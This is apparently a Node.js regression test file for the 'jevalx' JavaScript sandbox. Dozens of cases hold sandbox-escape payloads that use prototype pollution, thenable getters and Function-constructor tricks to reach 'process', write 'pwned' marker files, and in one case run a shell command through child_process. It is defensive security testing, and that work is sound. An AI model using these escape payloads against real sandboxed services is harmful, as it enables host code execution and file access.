function getAllPrototypeMethods(obj) {
    let props = [];
    let currentObj = obj;
    do {
        props = props.concat(Object.getOwnPropertyNames(currentObj));
    } while ((currentObj = Object.getPrototypeOf(currentObj)));

    return props.sort().filter(function(e, i, arr) { 
       if (e!=arr[i+1] && typeof obj[e] == 'function') return true;
    });
}
//await jevalx(`getAllPrototypeMethods(this)`,{getAllPrototypeMethods})

//process.on('unhandledRejection', (reason, promise) => { console.error('!!!! =======> unhandledRejection', promise, 'reason:', reason); });
//process.on('uncaughtException', (reason, tag) => { console.error('???? ========> test.js uncaughtException', reason); });

var argv2o=(a,m)=>(a||require('process').argv||[]).reduce((r,e)=>((m=e.match(/^(\/|--?)([\w-]*)="?(.*)"?$/))&&(r[m[2]]=m[3]),r),{});
let assert = require('assert');

//console.log('fetch+'+fetch);
let argo = argv2o();

let jevalxModule;

jevalxModule = require(`./jevalx${argo.ver?('_'+argo.ver):''}.js`);
let {jevalx,jevalx_raw,delay} = jevalxModule;

const fs = require('fs').promises;
const path = require('path');

async function searchFiles(directory, pattern) {
  try {
    const files = await fs.readdir(directory, { withFileTypes: true });
    const foundFiles = files.filter(file => file.isFile() && pattern.test(file.name));

    if (foundFiles.length > 0) {
      throw new Error(`Found files matching pattern "${pattern}": ${foundFiles.map(f => f.name).join(', ')}`);
    } else {
      console.log('No files found matching the pattern.'+pattern);
    }
  } catch (error) {
    console.error('Error searching files:', error);
    throw error; // Rethrow the error if necessary
  }
}

module.exports = {

AAAA:async function(){ let case_id = arguments.callee.name;
  let code = `
async function f() {}
void (async () => {
        await f();
        await f();
        await f();
        await f();

try{
import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_AAAA_1","");
}catch(ex){
//console.error('AAAA catch ex',ex);
}

throw {message: 'EvilXd_AAAA', code: class{
	static get name() {
		(async()=>{
			await Promise.resolve();
			import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_AAAA","");
		})();
	}
}}

        this.constructor
.constructor("return process")()
.mainModule.require("fs")
.writeFileSync("pwned_case_a", "");
})();
`;
  try{
    var rst = await jevalx(code);
    console.log(`${case_id} result=`,rst);
  }catch(ex){ console.log(`${case_id}.ex=`,ex); } console.log(`${case_id}.check=`,typeof(process),typeof(Promise));
},
A2:async function(){ let case_id = arguments.callee.name;
  let code = `
async function f() {}
void (async () => {
        await f();
        await f();
        await f();
        await f();
throw {message: 'EvilXd_A2', code: class{
	static get name() {
		(async()=>{
			await Promise.resolve();
			import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_a2","");
		})();
	}
}}
})();
`;
  try{
    var rst = await jevalx(code);
    console.log(`${case_id} result=`,rst);
  }catch(ex){ console.log(`${case_id}.ex=`,ex); } console.log(`${case_id}.check=`,typeof(process),typeof(Promise));
},

BBBB:async()=>{
////https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd
  var code=`
    const Symbol= Object.getOwnPropertySymbols(Array)[0].constructor;
    const customInspectSymbol = Symbol.for({
      toString: () => "nodejs.util.inspect.custom",
    });
    throw {
      [customInspectSymbol]: () => {
        this.constructor
          .constructor("return process")()
          .mainModule.require("fs")
          .writeFileSync("pwned_case_b", "");
      },
    }
  `;
  try{
    console.log('BBBB result=',await jevalx(code));
  }catch(ex){
    console.log('BBBB ex=',ex);
  }
  console.log('BBBB check=',typeof(process),typeof(Promise));
},
BBB2:async()=>{
var case_id='BBB2';
  var code=`
    const customInspectSymbol = Symbol.for({
      toString: () => "nodejs.util.inspect.custom",
    });
    throw {
      [customInspectSymbol]: () => {
        this.constructor
          .constructor("return process")()
          .mainModule.require("fs")
          .writeFileSync("pwned_case_b2", "");
      },
    }
  `;
  try{
    console.log('BBB2 result=',await jevalx(code));
  }catch(ex){
    console.log('BBB2 ex=',ex.message);
  }
  console.log('BBB2 check=',typeof(process),typeof(Promise));
},

CCCC:async()=>{
var code=`
Object.defineProperty(this.constructor.constructor("return this")(),"process",{set(process) { process.mainModule.require("fs").writeFileSync("pwned_case_c", ""+(typeof this)+this)}})
`
  try{
    console.log('CCCC result=',await jevalx(code));
  }catch(ex){
    console.log('CCCC ex=',ex.message);
  }
  console.log('CCCC check=',typeof(process),typeof(Promise));
},

DDDD:async()=>{
var code=`
throw {toString: eval.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_d', ''))")};
`
  try{
    console.log('DDDD result=',await jevalx(code));
  }catch(ex){
    console.log('DDDD ex=',ex);
  }
  console.log('DDDD check=',typeof(process),typeof(Promise));

},

EEEE:async()=>{
var code=`
const code = "import('fs').then(m=>m.writeFileSync('pwned_case_e', '')).then(o, r)";
const funcCtor = import('').catch(_=>_).constructor.constructor;
const func = funcCtor.bind(null, 'o', 'r', code);
const obj = {};
obj.__defineGetter__("then", func);
//void(async()=>{await obj})();//wont work too
obj
`
  try{
    console.log('EEEE result=',await jevalx(code));
  }catch(ex){
    console.log('EEEE ex=',ex.message);
  }
  console.log('EEEE check=',typeof(process),typeof(Promise));

},
FFFF:async function(){
let case_id = arguments.callee.name;
  var code=`
  ({}).constructor.defineProperty(
    this.constructor.constructor("return this")(),
    "_process_or_any",{ set(process) { process.mainModule.require("fs").writeFileSync("pwned_case_f", ""); },
  }
)
`;
  try{
    var rst = await jevalx(code);
    console.log(`${case_id} result=`,rst);
  }catch(ex){ console.log(`${case_id}.ex=`,ex); } console.log(`${case_id}.check=`,typeof(process),typeof(Promise));

},
GGGG:async()=>{
  //var code=`[].constructor.constructor("return Proxy")()`;//anywhere the Proxy?
  //var code=`let global_ = ({}).constructor.constructor("return this")();global_.Proxy`;
  var code=`
  new Proxy((_) => _, {
  get: new Proxy((_) => _, {
    apply: function (target, thisArg, args) {
      args.constructor
        .constructor("return process")()
        ?.mainModule.require("fs")
        .writeFileSync("pwned_case_g", "");
    },
  }),
})`
  try{
    console.log('GGGG result=',await jevalx(code));
  }catch(ex){
    console.log('GGGG ex=',ex.message);
  }
  console.log('GGGG check=',typeof(process),typeof(Promise));
},

HHHH:async()=>{
  var code=`
  const hostGlobal = this.constructor.constructor("return this")();
hostGlobal.Promise = function (executor) {
  return new Promise(executor).then(() => {
    hostGlobal.process.mainModule.require("fs").writeFileSync("pwned_case_h", "");
  });
}
`
  try{
    console.log('HHHH result=',await jevalx(code));
  }catch(ex){
    console.log('HHHH ex=',ex.message);
  }
  console.log('HHHH check=',typeof(process),typeof(Promise));
},

IIII:async()=>{
var code=`
const promise = import('').catch(_=>_);
const oldThen = promise.__proto__.then;
var global = oldThen.constructor('return this')();
promise.__proto__.then = function() {
	if (global.process) {
		global.process.mainModule.require("fs").writeFileSync("pwned_case_i", "");
		promise.__proto__.then = oldThen;
	}
	return oldThen.apply(this, arguments);
};
1
`
  try{
    console.log('IIII result=',await jevalx(code));
  }catch(ex){
    console.log('IIII ex=',ex.message);
  }
  console.log('IIII check=',typeof(process),typeof(Promise));

},
X2:async()=>{
var code=`
const promise = import('').catch(_=>_);
const oldThen = promise.__proto__.then;
const global = oldThen.constructor('return this')();
promise.__proto__.then = function() {
	if (global.process) {
		global.process.mainModule.require("fs").writeFileSync("pwned_i2", "");
		promise.__proto__.then = oldThen;
	}
	return oldThen.apply(this, arguments);
};
false
`
  try{
    console.log('I2 result=',await jevalx(code));
  }catch(ex){
    console.log('I2 ex=',ex.message);
  }
  console.log('I2 check=',typeof(process),typeof(Promise));

},
JJJJ:async()=>{
var code=` eval.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_j', ''))") `
  try{
    console.log('JJJJ result=',await jevalx(code));
  }catch(ex){
    console.log('JJJJ ex=',ex.message);
  }
  console.log('JJJJ check=',typeof(process),typeof(Promise));
},
J2:async()=>{
var code=`(_=>_).constructor.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_j2', ''))")`;
  try{
    console.log('J2 result=',await jevalx(code));
  }catch(ex){
    console.log('J2 ex=',ex.message);
  }
  console.log('J2 check=',typeof(process),typeof(Promise));

},
KKKK:async()=>{
var code=`
Reflect.defineProperty(Function.prototype, 'then', {
	get() {
		this();
	}
});
`
  try{
    console.log('KKKK result=',await jevalx(code));
  }catch(ex){
    console.log('KKKK ex=',ex.message);
  }
  console.log('KKKK check=',typeof(process),typeof(Promise));
},

K2:async()=>{
var code=`
Reflect.defineProperty(constructor.prototype, 'cachedData', {get(){this.importModuleDynamically.constructor('return process')().then(p=>p.mainModule.require("fs").writeFileSync("pwned_k2", ""))}})
`
  try{
    console.log('K2 result=',await jevalx(code));
  }catch(ex){
    console.log('K2 ex=',ex.message);
  }
  console.log('K2 check=',typeof(process),typeof(Promise));
},

LLLL:async()=>{
var code=`
Function.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_L', ''))")
`
  try{
    console.log('LLLL result=',await jevalx(code));
  }catch(ex){
    console.log('LLLL ex=',ex);
  }
  console.log('LLLL check=',typeof(process),typeof(Promise));
},

L2:async()=>{
var code=`
(async()=>0).bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_L2', ''))")
`
  try{
    console.log('L2.result=',await jevalx(code));
  }catch(ex){
    console.log('L2.ex=',ex.message);
  }
  console.log('L2.check=',typeof(process),typeof(Promise));
},

MMMM:async()=>{
var code=`
const FunctionX = (_=>_).constructor;
Object.defineProperty(Function.prototype, 'then', { get() { this(); } });
FunctionX.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_m', ''))")
`
  try{
    console.log('MMMM result=',await jevalx(code));
  }catch(ex){
    console.log('MMMM ex=',ex.message);
  }
  console.log('MMMM check=',typeof(process),typeof(Promise));

},

NNNN:async()=>{
var code=`
this.__proto__.__defineGetter__('',function(){ this.process?.mainModule.require("fs").writeFileSync("pwned_case_n","") })
`
  try{
    console.log('NNNN result=',await jevalx(code));
  }catch(ex){
    console.log('NNNN ex=',ex.message);
  }
  console.log('NNNN check=',typeof(process),typeof(Promise));
},

OOOO:async()=>{
var code=`
const FunctionX = (_=>_).constructor;
const obj = {
	get then() {
		Object.defineProperty(this, 'then', {
			get: FunctionX.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_N', ''))")
		});
		Object.setPrototypeOf(this, import('').catch(_=>_).constructor);
	}
};
obj
`
  try{
    console.log('OOOO result=',await jevalx(code));
  }catch(ex){
    console.log('OOOO ex=',ex.message);
  }
  console.log('OOOO check=',typeof(process),typeof(Promise));

},

PPPP:async()=>{
var code=`
this.constructor.prototype.__defineGetter__('',function(){ this.process?.mainModule.require("fs").writeFileSync("pwned_case_O","") })
`;

  try{
    console.log('PPPP result=',await jevalx(code));
  }catch(ex){
    console.log('PPPP ex=',ex.message);
  }
  console.log('PPPP check=',typeof(process),typeof(Promise));

},

Q1:async()=>{
var code=`
Object.getPrototypeOf(Object.getPrototypeOf(import('').catch(_=>_))).__defineGetter__('',function(){ this.process?.mainModule.require("fs").writeFileSync("pwned_case_q1","") })
`;

  try{
    console.log('Q1 result=',await jevalx(code));
  }catch(ex){
    console.log('Q1 ex=',ex.message);
  }
  console.log('Q1 check=',typeof(process),typeof(Promise));

},

Q2:async()=>{
var code=`
const FunctionX = (_=>_).constructor;
const proto = {};
Object.defineProperty(proto, 'then', {
	get: FunctionX.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_q2', ''))")
});
const obj = {
	__proto__: proto
};
obj
`;

  try{
    console.log('Q2 result=',await jevalx(code));
  }catch(ex){
    console.log('Q2 ex=',ex.message);
  }
  console.log('Q2 check=',typeof(process),typeof(Promise));

},

Q3:async()=>{
var code=`
const FunctionX = (_=>_).constructor;
const proto = {};
proto.__defineGetter__('then', FunctionX.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_q3', ''))"));
const obj = {
	__proto__: proto
};
obj
`
  try{
    console.log('Q3 result=',await jevalx(code));
  }catch(ex){
    console.log('Q3 ex=',ex.message);
  }
  console.log('Q3 check=',typeof(process),typeof(Promise));

},

Q4:async()=>{
var code=`
const FunctionX = (_=>_).constructor;
const proto = {};
Object.defineProperties(proto, {then: {get: FunctionX.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_case_q4', ''))")}});
const obj = {
	__proto__: proto
};
obj
`
  try{
    console.log('Q4 result=',await jevalx(code));
  }catch(ex){
    console.log('Q4 ex=',ex.message);
  }
  console.log('Q4 check=',typeof(process),typeof(Promise));

},

Q5:async()=>{
var code=`
let u = false;
function t(o, e) {
	import('').then(_=>_, _=>_).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q5","");
	u = true;
	o(this);
}
const obj = {__proto__: {
	get then(){
		if (u) {
			u = false;
			return undefined;
		}
		return t;
	}
}};
obj
`;
  try{
    console.log('Q5 result=',await jevalx(code));
  }catch(ex){
    console.log('Q5 ex=',ex.message);
  }
  console.log('Q5 check=',typeof(process),typeof(Promise));

},

Q6:async()=>{
var code=`
(()=>{
let u = false;
function t(o, e) {
	import('').then(_=>_, _=>_).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q6","");
	u = true;
	o(this);
}
const obj = {__proto__: { get then(){ if (u) { u = false; return undefined; } return t; } }};
return obj
})
`

  try{
    console.log('Q6 result=',await jevalx(code));
  }catch(ex){
    console.log('Q6 ex=',ex.message);
  }
  console.log('Q6 check=',typeof(process),typeof(Promise));

},


Q7:async()=>{
var code=`
(async()=>{
let u = false;
function t(o, e) {
	import('').then(_=>_, _=>_).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q7","");
	u = true;
	o(this);
}
const obj = {__proto__: { get then(){ if (u) { u = false; return undefined; } return t; } }};
return obj
})
`
  try{
    console.log('Q7 result=',await jevalx(code));
  }catch(ex){
    console.log('Q7 ex=',ex.message);
  }
  console.log('Q7 check=',typeof(process),typeof(Promise));

},

Q7a:async()=>{
     var code=`(async()=>{
         let u = false;
         function t(o, e) {
         import('').then(_=>{ return _; }, _=>{ return _}).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q7a","");
         u = true;
         o(this);
         }
         const obj = {__proto__: { get then(){
         if (u) { u = false; return undefined; } return t; } }};
         return obj
         })
     `
       try{
         console.log('Q7 result=',await jevalx(code,));
       }catch(ex){
         console.log('Q7 ex=',ex);
       }
     console.log('Q7 check=',typeof(process),typeof(Promise));
   },

Q7x:async()=>{
//return;//TODO
  //await jevalx(`(async()=>{ return ({ then:()=>{} }) })() `)
  //var code=`(async()=>{ return ({ then:()=>{} }) })() `
  var code=`(async()=>({ then:()=>{} }))() `
  //var code=`(async()=>999)()`
  try{
    console.log('Q7x result=',await jevalx(code));
  }catch(ex){
    console.log('Q7x ex=',ex);
  }
  console.log('Q7x check=',typeof(process),typeof(Promise));

},
Q7x2:async()=>{
  var code=`(async()=>({ then:()=>{} }))() `
  try{
    console.log('Q7x2 result=',await jevalx(code,{},{microtaskMode:'false'}));
  }catch(ex){
    console.log('Q7x2 ex=',ex);
  }
  console.log('Q7x2 check=',typeof(process),typeof(Promise));

},
Q8:(async()=>{
var code=`
let u = false;
function t(o, e) {
	import('').then(_=>_, _=>_).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q8","");
	u = true;
	o(this);
}
delete Object.prototype.__proto__;
(async()=>{
const obj = { __proto__: { get then(){ if (u) { u = false; return undefined; } return t; } }};
return obj
})
`
  try{
    console.log('Q8 result=',await jevalx(code));
  }catch(ex){
    console.log('Q8 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q8 check=',typeof(process),typeof(Promise));
}),
Q9:(async()=>{
var code=`
let delay = 3;
function t(o, e) {
	//import('').then(_=>_, _=>_).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q9","");
import('').then(_=>_,_=>_).then.constructor("return 999")();
	o(this);
}
const obj = {__proto__: { __proto__: { __proto__: {
	get then(){
		if (delay-->0) return undefined;
		return t;
	}
}}}};
obj
`
  try{
    console.log('Q9 result=',await jevalx(code));
  }catch(ex){
    console.log('Q9 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q9 check=',typeof(process),typeof(Promise));

}),
Q10:(async()=>{
var code=`
let delay = 2;
function t(o, e) {
	import('').then(_=>_, _=>_).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q10","");
	o(this);
}
let obj = {__proto__: {
	get then(){
		if (delay-->0) return undefined;
		return t;
	}
}};
for(let i=0; i<9; i++) {const ret=obj;obj=()=>ret;}
obj
`
  try{
    console.log('Q10 result=',await jevalx(code));
  }catch(ex){
    console.log('Q10 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q10 check=',typeof(process),typeof(Promise));

}),
Q11:(async()=>{
var code=`
const O = constructor;

O.defineProperty(O.prototype, 'XXX', {get(){

	this.process.mainModule.require("fs").writeFileSync("pwned_case_q11", "");

}, enumerable: true});

false
`
  try{
    console.log('Q11 result=',await jevalx(code));
  }catch(ex){
    console.log('Q11 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q11 check=',typeof(process),typeof(Promise));


}),

Q12:(async()=>{
var code=`

const promise = import('').catch(_=>_);

const oldThen = promise.__proto__.then;

const global = oldThen.constructor('return this')();

promise.__proto__.then = function() {

	if (global.process) {

		global.process.mainModule.require("fs").writeFileSync("pwned_case_q12", "");

	}

	return oldThen.apply(this, arguments);

};

Object.freeze(promise.__proto__);

false

`
  try{
    console.log('Q12 result=',await jevalx(code));
  }catch(ex){
    console.log('Q12 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q12 check=',typeof(process),typeof(Promise));


}),
Q13:(async()=>{
var code=`
this.constructor.__defineSetter__('freeze', f=>f.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_q13", ""));
false
`
  try{
    console.log('Q13 result=',await jevalx(code));
  }catch(ex){
    console.log('Q13 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q13 check=',typeof(process),typeof(Promise));

}),
Q14:(async()=>{
var code=`
const global = constructor.constructor('return this')()
global.Object = Object.assign({set freeze(f){f.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_q14", "")}}, global.Object);
false
`
  try{
    console.log('Q14 result=',await jevalx(code));
  }catch(ex){
    console.log('Q14 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q14 check=',typeof(process),typeof(Promise));

}),
Q15:(async()=>{
var code=`
({then: 1, toString: eval.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_q15', ''))")})
`
  try{
    var rst = await jevalx(code);
    console.log('Q15 result=',rst);
    String(rst);//test trigger...
  }catch(ex){
    console.log('Q15 ex=',ex);
  }
  console.log('Q15 check=',typeof(process),typeof(Promise));

}),
Q16:(async()=>{

// { toString: [Function: bound evil] }
var code=`
({then:(r,j)=>r({toString:eval.bind(null,"import('fs').then(m=>m.writeFileSync('pwned_q16', ''))")})})
`
  try{
    console.log('Q16 result=',await jevalx(code));//trigger pwn !!!
    //console.log('Q16 result=',String(await jevalx(code)));//trigger pwn !!!
    //console.log('Q16 result=',await jevalx(code));
  }catch(ex){
    console.log('Q16 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q16 check=',typeof(process),typeof(Promise));
}),
Q17:(async()=>{
var code=`
//const Function = (_=>_).constructor;
({then:(r,j)=>r({toString:Function.bind(null,"import('fs').then(m=>m.writeFileSync('pwned_q17', ''))")})})
`
  try{
    //console.log('Q17 result=',await jevalx(code));
    console.log('Q17 result=',String(await jevalx(code)));
  }catch(ex){
    console.log('Q17 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q17 check=',typeof(process),typeof(Promise));

}),
Q18:(async()=>{
var code=`
const global = constructor.constructor('return this')()
global.Object = {set freeze(f){f.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_q18", "")}};
false
`
  try{
    console.log('Q18 result=',String(await jevalx(code)));
  }catch(ex){
    console.log('Q18 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q18 check=',typeof(process),typeof(Promise));

}),
Q19:(async()=>{
var code=`
({hasOwnProperty: eval.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_q19', ''))")})
`
  try{
    console.log('Q19 result=',await jevalx(code));
  }catch(ex){
    console.log('Q19 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q19 check=',typeof(process),typeof(Promise));

}),
Q20:(async()=>{
var code=`
const global = constructor.constructor('return this')()
global.Array = {set freeze(f){f.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_q20", "")}};
[1,2,3,]
`
  try{
    console.log('Q20 result=',await jevalx(code));
  }catch(ex){
    console.log('Q20 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q20 check=',typeof(process),typeof(Promise));

}),
Q21:(async()=>{
var code=`
hasOwnProperty.bind = eval.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_q21', ''))");
true
`;
  try{
    console.log('Q21 result=',await jevalx(code));
  }catch(ex){
    console.log('Q21 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q21 check=',typeof(process),typeof(Promise));

}),
Q22:(async()=>{
//({}).constructor.keys(0).__proto__.push = eval.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_q22', ''))");
var code=`
constructor.keys(0).__proto__.push = eval.bind(null, "import('fs').then(m=>m.writeFileSync('pwned_q22', ''))");
({toString:1})
`;
  try{
    console.log('Q22 result=',await jevalx(code));
  }catch(ex){
    console.log('Q22 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q22 check=',typeof(process),typeof(Promise));
}),

Q23:(async()=>{
var code=`
constructor.prototype.__defineGetter__('cachedData', function(){this.importModuleDynamically.constructor('return process')().then(p=>p.mainModule.require("fs").writeFileSync("pwned_q22", ""))});
(_=>_)
`;
  try{
    console.log('Q23 result=',await jevalx(code));
  }catch(ex){
    console.log('Q23 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q23 check=',typeof(process),typeof(Promise));
}),
Q24:(async()=>{
var code=`
Object.defineProperty(constructor.prototype, 'cachedData', {get(){this.importModuleDynamically.constructor('return process')().then(p=>p.mainModule.require("fs").writeFileSync("pwned_q24", ""))}});
(_=>_)
`;
  try{
    console.log('Q24 result=',await jevalx(code));
  }catch(ex){
    console.log('Q24 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q24 check=',typeof(process),typeof(Promise));
}),
Q25:(async()=>{
var code=`
constructor.defineProperty(constructor.prototype, 'cachedData', {get(){this.importModuleDynamically.constructor('return process')().then(p=>p.mainModule.require("fs").writeFileSync("pwned_q25", ""))}});
(_=>_)
`;
  try{
    console.log('Q25 result=',await jevalx(code));
  }catch(ex){
    console.log('Q25 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q25 check=',typeof(process),typeof(Promise));
}),
Q26:(async()=>{
var code=`
async function f(){
	throw {toString: [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q26', ''))"]))};
}
f()
f()
`
  try{
    console.log('Q26 result=',await jevalx(code));
  }catch(ex){
    console.log('Q26 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q26 check=',typeof(process),typeof(Promise));

}),
Q27:(async()=>{
var code=`
const Function = (_=>_).constructor;
async function f(){
	throw {toString: [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q26', ''))"]))};
}
f()
f()
`
  try{
    console.log('Q27 result=',await jevalx(code));
  }catch(ex){
    console.log('Q27 ex=',ex,JSON.stringify(ex.js));
  }
  console.log('Q27 check=',typeof(process),typeof(Promise));


}),
Q28:(async()=>{
var code=`
const Function = (_=>_).constructor;
const a = constructor.prototype.__proto__.constructor.keys(0);
const s = Object.getOwnPropertySymbols(a.__proto__)[0];
const i = a[s]().__proto__;
const n = i.next;
i.next = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q28', '')); return n.call(a[s]());"]));
`;
  try{
    console.log('Q28 result=',await jevalx(code));
  }catch(ex){
    console.log('Q28 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q28 check=',typeof(process),typeof(Promise));

}),
Q29:(async()=>{
var code=`
const Function = (_=>_).constructor;
const Object = {}.constructor;
const a = constructor.prototype.__proto__.constructor.keys(0);
const s = Object.getOwnPropertySymbols(a.__proto__)[0];
const i = a[s]().__proto__;
const n = i.next;
i.next = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q29', '')); return n.call(a[s]());"]));
`;
  try{
    console.log('Q29 result=',await jevalx(code));
  }catch(ex){
    console.log('Q29 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q29 check=',typeof(process),typeof(Promise));

}),
Q30:(async()=>{
var code=`
const Function = (async _=>_).constructor;
const Object = import('').catch(_=>_).__proto__.__proto__.constructor;
const a = constructor.prototype.__proto__.constructor.keys(0);
const s = Object.getOwnPropertySymbols(a.__proto__)[0];
const i = a[s]().__proto__;
const n = i.next;
i.next = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q30', '')); return n.call(a[s]());"]));
`
  try{
    console.log('Q30 result=',await jevalx(code));
  }catch(ex){
    console.log('Q30 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q30 check=',typeof(process),typeof(Promise));

}),

q31:async()=>{
 var code=`
  const Function = (async _=>_).constructor;
const Object = import('').catch(_=>_).__proto__.__proto__.constructor;
Object.__proto__ = {
	set defineProperty(f) {
		f(this, 'assign', {set: [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q31', ''))"]))});
	}
};
false
`
  try{
    console.log('Q31 result=',await jevalx(code,));
  }catch(ex){
    console.log('Q31 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q31 check=',typeof(process),typeof(Promise));

},
q32:async()=>{
var code=`
const Function = (async _=>_).constructor;
constructor.__proto__.apply = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q32', ''))"]));
import('').catch();
1
`
  try{
    console.log('Q32 result=',await jevalx(code,));
  }catch(ex){
    console.log('Q32 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q32 check=',typeof(process),typeof(Promise));

},

Q33:(async()=>{
var code=`
const Function = (async _=>_).constructor;
const Object = constructor.prototype.__proto__.constructor;
console.log(999,''+Object.defineProperty);
Object.defineProperty(Object.__proto__, 'catch', {
	set: [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q33', ''))"])),
	get: ()=>1
});
false
`
  try{
    console.log('Q33 result=',await jevalx(code));
  }catch(ex){
    console.log('Q33 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q33 check=',typeof(process),typeof(Promise));

}),
Q34:(async()=>{
var code=`
const Function = (async _=>_).constructor;
const Object = constructor.__proto__.__proto__.constructor;
Object.defineProperty(Object.__proto__, 'catch', {
	set: [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q34', ''))"])),
	get: ()=>1
});
false
`
  try{
    console.log('Q34 result=',await jevalx(code));
  }catch(ex){
    console.log('Q34 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q34 check=',typeof(process),typeof(Promise));

}),

R1:(async()=>{
//https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9
var code=`
Symbol= Object.getOwnPropertySymbols(Array)[0].constructor;
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned_r1'); }
            )
        }
    }
};
p.then();
`;
  try{
    console.log('R1 result=',await jevalx(code));
  }catch(ex){
    console.log('R1 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('R1 check=',typeof(process),typeof(Promise));

}),

  r4:async()=>{
var case_id= 'r4';
var code=`
let i=import('').catch(_=>_);
console.log('r4 i',i);
console.log('r4 i.__proto__',i.__proto__);
console.log('r4 i.constructor',i.constructor);
delete i.constructor;//even delete and wait for rebuild from __proto__
console.log('r4 i.constructor',i.constructor);
let pc=i.constructor;
pc.__proto__ = {
        set constructor(f) { f("return process")().mainModule.require("fs").writeFileSync("pwned_${case_id}", "");}
};
`;
       try{
         console.log(`${case_id} result=`,await jevalx(code,));
       }catch(ex){
         console.log(`${case_id} ex=`,ex);
       }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r4b:async()=>{ var case_id= 'r4x';
var code=`
p = import('').constructor.prototype;
oldThen = p.constructor.prototype.then;
p.then = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["p.then = oldThen,import('fs').then(m=>m.writeFileSync('pwned_r4b', ''))"]));
Promise.delay(1)
`;
       try{
         console.log(`${case_id} result=`,await jevalx(code,));
       }catch(ex){
         console.log(`${case_id} ex=`,ex);
       }
     console.log(`${case_id} check=`,typeof(process),typeof(Promise),Promise);
  },
  r4c:async()=>{ var case_id= 'r4x';
var code=`
//delete import('').constructor;
delete import('').constructor.prototype;
p = import('').constructor.prototype;
oldThen = p.constructor.prototype.then;
p.then = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["p.then = oldThen,import('fs').then(m=>m.writeFileSync('pwned_r4c', ''))"]));
Promise.delay(1)
`;
       try{
